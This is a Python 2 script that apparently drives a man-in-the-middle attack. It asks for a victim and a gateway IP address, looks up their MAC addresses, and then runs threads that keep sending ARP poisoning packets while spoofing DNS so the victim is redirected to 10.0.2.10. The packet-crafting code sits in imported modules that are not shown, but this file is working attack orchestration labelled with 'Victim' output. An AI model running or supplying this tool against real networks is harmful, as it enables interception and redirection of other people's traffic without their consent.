from getmac import get_mac
from arppoisoning import Arptarget
import time
import thread
import sys


# 2 options for DNS spoofing:
#Option 1 using sniff
from dnsspoof_sniff import dns_spoof

#Option 2 using nfqueue
#from dnsspoof_nfqueue import dns_spoof



#################################################################
####################### Configuration ###########################
#################################################################

# time interval between ARP replies
global arp_interval
arp_interval = 1.5

# IP address redirect target to
global spoof_ip
spoof_ip = "10.0.2.10"

################################################################
####################### Main Script ############################
################################################################


# get IP addresses and serach for MAC addresses
targetip = str(raw_input("Please enter the target device's IP address: \n"))
gatewayip = str(raw_input("Please enter the gateway's IP address: \n"))

#global spoof_ip
#spoof_ip = str(raw_input("Please enter the spoofed IP address of your website: \n"))

#global arp_interval
#arp_interval = int(raw_input("Please enter the time interval in between ARP replies (In Seconds): \n"))

print ("-------------------------------Searching MAC address-------------------------------------")


try:
	targetmac = get_mac(targetip)
	gatewaymac = get_mac(gatewayip)
except:
	print ("Make sure you entered the correct IP addresses and the devices are turned on. \n\
			Application Closed, please try again")
	sys.exit()


print("Victim IP: "+ targetip + ", Victim MAC: " + targetmac)
print("Gateway IP: "+ gatewayip + ", Gateway MAC: " + gatewaymac)


# arp poisoning thread
def arp_poison():
	arpspoofer= Arptarget(targetip,targetmac,gatewayip,gatewaymac)
	arpspoofer.gen_packet()
	print ("ARP Poisoning has started, please enter the word \"exit\" to stop the program:\n")
	while True:
		arpspoofer.send_packet()
		time.sleep(arp_interval)


# dns spoofing thread
def dns_spoofing():
	dns_spoof(targetip,spoof_ip)



# User types 'exit' to end
def edof():
	while True:
		check_exit = str(raw_input())
		if check_exit == "exit":
			sys.exit()
		else:
			continue




if __name__ == "__main__":
	thread.start_new_thread(arp_poison,())
	thread.start_new_thread(dns_spoofing,())

	edof()


